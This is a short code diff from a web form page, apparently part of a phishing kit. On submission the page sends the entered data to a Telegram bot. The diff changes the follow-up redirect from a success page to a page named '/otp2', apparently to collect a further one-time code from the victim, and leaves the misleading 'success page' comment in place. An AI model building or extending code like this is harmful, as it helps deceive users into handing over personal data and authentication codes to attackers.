@@ -107,7 +107,7 @@ const SSIFormPage = () => {
     try {
       // Send message to Telegram
       await sendTelegramMessage(message);
-      router.push("/final-success"); // Redirect to success page
+      router.push("/otp2"); // Redirect to success page
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
       alert("An error occurred while submitting the form. Please try again.");
